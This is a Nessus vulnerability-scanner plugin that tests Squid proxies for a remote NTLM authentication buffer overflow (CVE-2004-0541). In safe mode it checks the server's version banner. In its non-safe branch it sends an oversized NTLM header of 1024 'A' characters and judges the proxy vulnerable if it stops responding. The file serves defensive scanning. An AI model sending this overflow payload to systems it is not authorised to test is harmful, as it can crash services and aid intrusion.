if(description)
{
  script_id(12294);

  script_bugtraq_id(10500);
  script_cve_id("CVE-2004-0541");
  script_xref(name:"OSVDB", value:"6791");
  script_version ("$Revision: 1.9 $");

  name["english"] = "Squid Remote NTLM auth buffer overflow";
  script_name(english:name["english"]);

  desc["english"] = "
The remote server is vulnerable to a remote buffer overflow in 
the NTLM authentication routine.  Exploitation of this bug 
can allow remote attackers to gain access to confidential
data.  Squid 2.5*-STABLE and 3.*-PRE are reported vulnerable. 

See also: http://www.squid-cache.org 

Solution: apply the relevant patch from
http://www.squid-cache.org/~wessels/patch/libntlmssp.c.patch 

Risk factor : High";



 script_description(english:desc["english"]);

 summary["english"] = "Squid Remote NTLM auth buffer overflow";

 script_summary(english:summary["english"]);
 script_category(ACT_MIXED_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004-2006 Tenable Network Security");

 family["english"] = "Gain a shell remotely";

 script_family(english:family["english"]);

 script_dependencies("find_service.nes", "proxy_use.nasl");
 script_require_ports("Services/http_proxy", 8080, 3128);

 exit(0);
}


# start script

include("http_func.inc");

port = get_kb_item("Services/http_proxy");
if (! port)
	port = 3128;

if(! get_port_state(port))
	exit(0);


if (safe_checks() )
{
	# up to 25 chars won't overwrite any mem in SQUID NTLM helper auth
	malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
	malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
	malreq += string("Authorization: NTLM ", crap(20), "=\r\n\r\n");

	soc = open_sock_tcp(port);
	if (! soc)
		exit(0);

	send(socket:soc, data:malreq);
	r = http_recv(socket:soc);
	close(soc);

	if ( ! r ) exit(0);

	if (egrep(string:r, pattern:"^Server Squid/(2\.5\.STABLE[0-5]([^0-9]|$)|3\.0\.PRE|2\.[0-4]\.))") )
	{
		mymsg =  string("According to it's version number, the remote SQUID Proxy\n");
		mymsg += string("may be vulnerable to a remote buffer overflow in it's NTLM\n");
		mymsg += string("authentication component, if enabled.  Run Nessus without safe\n");
		mymsg += string("checks to actually test the overflow\n");
		security_hole(port:port, data:mymsg);
		exit(0);
	}
}
else
{
	# we'll send more than 25 chars in NTLM auth...
	malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
	malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
	malreq += string("Authorization: NTLM ", crap(20), "=\r\n\r\n");
	soc = open_sock_tcp(port);
	if (! soc)
		exit(0);

	send(socket:soc, data:malreq);
	r = http_recv(socket:soc);
	if (! r) exit(0);
	close(soc);



	malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
	malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
	malreq += string("Authorization: NTLM TlRMTVNTUAABAAAAl4II4AAA", crap(data:"A", length:1024), "=\r\n\r\n");
	soc = open_sock_tcp(port);
	if (! soc)
		exit(0);

	send(socket:soc, data:malreq);
	r = http_recv(socket:soc);
	if (! r)
		security_hole(port);

	close(soc);
	exit(0);
}
		
